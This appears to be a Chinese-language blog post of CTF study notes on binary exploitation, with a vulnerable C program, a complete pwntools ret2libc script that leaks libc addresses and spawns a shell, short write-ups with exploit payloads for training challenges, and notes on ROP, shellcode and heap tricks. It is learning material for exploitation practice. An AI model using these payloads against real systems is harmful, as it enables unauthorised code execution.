+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int y=1;</span><br><span class="line">	printf(&quot;%p\n&quot;,&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们打印出来就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ./a.out     </span><br><span class="line">0x7fffffffde54</span><br></pre></td></tr></table></figure>
+<p>可是使用pwntools直接process启这个进程发现确实会出现向后偏移0x10字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./a.out&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  demo python te.py </span><br><span class="line">[+] Starting local process &#x27;./a.out&#x27;: pid 13184</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./a.out&#x27; stopped with exit code 0 (pid 13184)</span><br><span class="line">[DEBUG] Received 0xf bytes:</span><br><span class="line">    &#x27;0x7fffffffde64\n&#x27;</span><br><span class="line">0x7fffffffde64</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[DEBUG] Sent 0x1 bytes:</span><br><span class="line">    &#x27;\n&#x27; * 0x1</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
+<p>发现这是一个普遍问题,所以以后找ret地址必须要gdb进行调试后再填写,不然会出现问题,当然解决办法也可以是多填写一些<code>nop</code>,只要位置够,当然象这种直接在栈上写shellcode的题也确实不多,毕竟这么简单</p>
+<p>今天主要运用rop解决pwn,其中有很多繁杂的知识点我们一起处理一下,源程序还是那个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">  </span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是这次开了aslr和nx,所以我们必须把这些东西泄漏出来,,我们直接根据exp来分析.具体操作如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;libc.so&#x27;)</span><br><span class="line">elf = ELF(&#x27;level2&#x27;)</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./level2&#x27;)</span><br><span class="line">#p = remote(&#x27;127.0.0.1&#x27;, 10003)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[&#x27;write&#x27;]</span><br><span class="line">print &#x27;plt_write= &#x27; + hex(plt_write)</span><br><span class="line">got_write = elf.got[&#x27;write&#x27;]</span><br><span class="line">print &#x27;got_write= &#x27; + hex(got_write)</span><br><span class="line">vulfun_addr = 0x08048404</span><br><span class="line">print &#x27;vulfun= &#x27; + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;a&#x27;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)</span><br><span class="line"></span><br><span class="line">print &quot;\n###sending payload1 ...###&quot;</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">print &quot;\n###receving write() addr...###&quot;</span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line">print &#x27;write_addr=&#x27; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;</span><br><span class="line">system_addr = write_addr - (libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;])</span><br><span class="line">print &#x27;system_addr= &#x27; + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))</span><br><span class="line">print &#x27;binsh_addr= &#x27; + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &#x27;a&#x27;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">print &quot;\n###sending payload2 ...###&quot;</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="纸上谈兵"><a href="#纸上谈兵" class="headerlink" title="纸上谈兵"></a>纸上谈兵</h2><p>首先我们根据objdump能搞出来write函数的got和plt表,之后可以利用<code>plt_write</code>把<code>got_write</code>即真正到内存里的地址泄漏出来,得到<code>got_write</code>后我们又有原来的libc,故而能根据偏移找到system和sh的地址,而这个这个程序很简单,我们可以有一个<code>vulfun_addr</code>函数不断的跳,也算是一个很好的工具函数</p>
+<blockquote>
+<p>got和plt</p>
+</blockquote>
+<p>在这个exp中我们可以简单理解一下这两个惺惺相惜的表,所谓got就是到内存中的真实地址,而plt只是链接到got的一个跳转表,使用plt可以使用该函数,而同时我们应该注意,在执行<code>call function</code>时要填入got地址,因为是直接去调用</p>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>所谓栈溢出就是告诉我们函数调用过程时会把ret即函数执行完的地址放入栈中,我们利用缓冲区的溢出将其覆盖后即可跳转到我们自己的shellcode</p>
+<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>本篇在shellcode的变形让我受益匪浅比如一些很恶心的题会将我们的输入进行解码在写到栈中,所以我们必须先逆向出来算法,当然一般这种题的知识点点到为止,不会在算法上太难为我们,而shellcode变形这块就更恶心了.</p>
+<p>例如我们在栈中写入了shellcode,我们到eip时跳到shellcode开始处,这时我们的shellcode含有一些push操作,这时如果我们的shellcode结尾布置到了紧靠esp的位置,那就要考虑是否有覆盖的问题,所以这时的解决方法就是将shellcode进行拆分,中间有一个<code>jump $当前指令+偏移量</code>进行拼接,即可完成起shell</p>
+<h2 id="溢出点进阶"><a href="#溢出点进阶" class="headerlink" title="溢出点进阶"></a>溢出点进阶</h2><p>我们之前知道了栈的ret可以受我们控制,那么我们是否可以将某些敏感函数写入ret呢,答案是肯定的,同时要在32位程序中函数的参数是布置在栈中的</p>
+<p>(示意图,待画)</p>
+<p>所以我们完全可以这样布置<code>padding(到达溢出点)+function_we_want+ret+parameter</code></p>
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>这篇我们要深入理解ret的含义,要知道ret在汇编中代表这<code>pop eip</code>,暂且这么理解,这就像我们在栈中布置了一个地址,例如是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x123   push eax</span><br><span class="line">0x134   ret</span><br></pre></td></tr></table></figure>
+<p>例如我们的程序溢出点是20个,我们就可以这么构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">0x123&lt;-原ret</span><br></pre></td></tr></table></figure>
+
+<p>我们把0x123写入栈的ret,那么我们的程序在会跳转到<code>push eax</code>中,之后又执行ret,但是我们的栈顶指向eax,所以我们就会跳转到eax的指向中,大家可以好好理解一下</p>
+<h2 id="vsdo"><a href="#vsdo" class="headerlink" title="vsdo"></a>vsdo</h2><p>这个的点就比较骚了，我们知道只要程序开启了pie，我们就很难确定libc中的函数，所以我们这时候看到vsdo在内存中的位置是不变的,这时我们根据调用函数的返回值.可以利用他来起shell,比如说我们通过one_gagede找到了一个片段,其中的限制条件是eax为0,我们就可以根据他来起</p>
+<p>这几天做题发现没有什么会做的,还是要夯实基础,于是在<strong>i春秋</strong>上找了篇教程也算是重新学习一遍吧,环境搭建不谈了,还有做题环境(ida,pwntools),没有gdb可能觉得对新手不太友好,我也不算新手了,算是个老菜鸡了,还是做吧</p>
+<h2 id="溢出点寻找"><a href="#溢出点寻找" class="headerlink" title="溢出点寻找"></a>溢出点寻找</h2><p>这个作者写的栈溢出基础,关键就是溢出点的判断,<strong>hello</strong>和<strong>csaw ctf 2016 quals-warmup</strong>不谈了,直接无脑<code>cyclic</code>就行,从之后开始就开始学新东西了</p>
+<h3 id="doubly-dangerous"><a href="#doubly-dangerous" class="headerlink" title="doubly_dangerous"></a>doubly_dangerous</h3><p>这题没有找到很好的思路,溢出点的思路行不通,只能通过让<code>if</code>的语句成立,<code>s</code>和<code>v5</code>相差<strong>0x40</strong>个字节,直接修改<code>v5</code>即可,修改后的exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io =process(&#x27;doubly_dangerous&#x27;)</span><br><span class="line">payload = &#x27;A&#x27;*64</span><br><span class="line">payload += &quot;\x00\x80\x34\x41&quot;</span><br><span class="line"></span><br><span class="line">print io.recv()					</span><br><span class="line">io.sendline(payload)			</span><br><span class="line">print io.recv()					</span><br></pre></td></tr></table></figure>
+
+<h3 id="sCTF-2016-q1-pwn1"><a href="#sCTF-2016-q1-pwn1" class="headerlink" title="sCTF 2016 q1-pwn1"></a>sCTF 2016 q1-pwn1</h3><p>这题思路很请奇,<code>fget</code>只接收32个字节,我们可以知道到栈底有0x3c个字节,加上ebp足足有0x40个字节,也就是64个字节,但是我们使用ida分析的时候会发现他进行了个替换,把所有<code>I</code>替换成了<code>you</code>,这样我们只需要写<code>I*(63/3)+x+ret</code>即可完成</p>
+<h3 id="Tokyo-West-CTF-3rd-2017-just-do-it"><a href="#Tokyo-West-CTF-3rd-2017-just-do-it" class="headerlink" title="Tokyo West CTF 3rd 2017-just_do_it"></a>Tokyo West CTF 3rd 2017-just_do_it</h3><p>本题也并不是修改ret,而是要将<strong>v6</strong>的值进行改写因为会最后<code>put(v6)</code>,而且我们之前的flag文件已经打开存到了bss中</p>
+<ul>
+<li>直接到ret前看stack前4字节</li>
+</ul>
+<h2 id="some-bugs"><a href="#some-bugs" class="headerlink" title="some bugs"></a>some bugs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.查是否合法</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">	uint8_t* a = (uint8_t*) malloc(1);</span><br><span class="line">	void * B = malloc(0x10);</span><br><span class="line">	malloc(0x60);</span><br><span class="line">	a[8+16] = 0x41;</span><br><span class="line">	*(size_t*)(B+0x38) = 0x21;</span><br><span class="line">	free(B);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.malloc后的参数</span><br><span class="line">我之前一直以为是 4 个字节,后来发现可以是 8 个字节,这就是 house of force的基础,只要有这种 malloc(size_t) 这种都可以往这方面靠</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/08/08/2019-08-08-some_note/" data-id="cuidOcpP1U8BZoQgFZZ8BFnu3" data-title="一些笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/08/26/2019-08-26-re2dlresolve/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          高阶rop之
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/06/25/2019-06-25-kr_1st/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">pwnable.kr</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
